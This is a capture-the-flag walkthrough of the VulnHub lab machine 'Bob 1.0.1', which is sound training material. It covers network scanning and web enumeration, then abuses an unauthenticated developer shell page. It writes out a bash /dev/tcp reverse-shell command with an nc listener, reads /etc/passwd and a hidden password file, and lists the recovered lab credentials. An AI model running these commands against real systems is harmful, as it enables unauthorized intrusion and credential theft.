
## Bob : 1.0.1


- **Bob : 1.0.1** :-

- Download the machine : [https://www.vulnhub.com/entry/bob-101,226/](https://www.vulnhub.com/entry/bob-101,226/)

![file:///tmp/.K3ULS3/1.png](file:///tmp/.K3ULS3/1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1. Network Scanning :

- Find the machine IP :

nmap -sn 192.168.31.0/24

![file:///tmp/.K3ULS3/2.png](file:///tmp/.K3ULS3/2.png)

- Find available port in the machine :

nmap -v -p- 192.168.31.228

![file:///tmp/.K3ULS3/3.png](file:///tmp/.K3ULS3/3.png)

nmap -sC -sV -A 192.168.31.228

![file:///tmp/.K3ULS3/4.png](file:///tmp/.K3ULS3/4.png)

- IP visit in browser : [http://192.168.31.228/](http://192.168.31.228/)

- This command runs an aggressive scan and uses the http-enum script to identify potential CGI directories .

nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.31.228

![file:///tmp/.K3ULS3/5.png](file:///tmp/.K3ULS3/5.png)

1. Web Enumeration :

- Found URLs : [http://192.168.31.228/robots.txt](http://192.168.31.228/robots.txt)

![file:///tmp/.K3ULS3/6.png](file:///tmp/.K3ULS3/6.png)

[http://192.168.31.228/login.html](http://192.168.31.228/login.html)

![file:///tmp/.K3ULS3/7.png](file:///tmp/.K3ULS3/7.png)

http://192.168.31.228/passwords.html

http://192.168.31.228/dev_shell.php

http://192.168.31.228/lat_memo.html

1. In robots.txt file already have /dev_shell.php file :

/dev_shell.php

![file:///tmp/.K3ULS3/8.png](file:///tmp/.K3ULS3/8.png)

- Open this file in browser :

http://192.168.31.228/dev_shell.php

![file:///tmp/.K3ULS3/9.png](file:///tmp/.K3ULS3/9.png)

- Run the command if get the output then confirm get the reverse shell :

id

![file:///tmp/.K3ULS3/10.png](file:///tmp/.K3ULS3/10.png)

ip a

![file:///tmp/.K3ULS3/11.png](file:///tmp/.K3ULS3/11.png)

1. Get Reverse Shell :

- Start listener on attacker machine :

nc -lvnp 4444

- Now Run the command in dev_shell input box :

bash -c 'bash -i >& /dev/tcp/192.168.31.206/4444 0>&1'

![file:///tmp/.K3ULS3/12.png](file:///tmp/.K3ULS3/12.png)

- Then get the command ➝ shell is received.

![file:///tmp/.K3ULS3/13.png](file:///tmp/.K3ULS3/13.png)

1. After get the reverse shell, Now FTP Login :

- Show the /etc/passwd file :

cat /etc/passwd

![file:///tmp/.K3ULS3/14.png](file:///tmp/.K3ULS3/14.png) Find the 3 local user .

- In reverse shell run the command :

ls -la /home/jc

ls -la /home/seb

ls -la /home/bob

![file:///tmp/.K3ULS3/15.png](file:///tmp/.K3ULS3/15.png) Show the password file .

- Read the password file :

cat /home/bob/.old_passwordfile.html

![file:///tmp/.K3ULS3/16.png](file:///tmp/.K3ULS3/16.png)

- Find local user and password :

jc  :  Qwerty  
seb  :  T1tanium_Pa$$word_Hack3rs_Fear_M3

- Now login the ftp :

ftp 192.168.31.228

![file:///tmp/.K3ULS3/17.png](file:///tmp/.K3ULS3/17.png) Now login the ftp with seb user .

![file:///tmp/.K3ULS3/18.png](file:///tmp/.K3ULS3/18.png) Now login the ftp with jc user .

- Vulnerability Type :

- Command Execution Vulnerability :

- Vulnerable File :

/dev_shell.php

- Description :
- The file dev_shell.php contains a developer command shell that allows users to execute system commands directly from the web interface. Because there is no authentication or input validation, an attacker can execute arbitrary commands on the server.

- Impact :

- An attacker can :

- Execute system commands
- Gain a reverse shell
- Access sensitive files
- Escalate privileges
- Fully compromise the server

- Severity :
- Critical — Remote Command Execution

- In Short Note :

Vulnerability : Remote Command Execution  
File : /dev_shell.php  
Impact : Allows execution of arbitrary system commands without authentication.  
Result : Attacker can obtain reverse shell and compromise the system.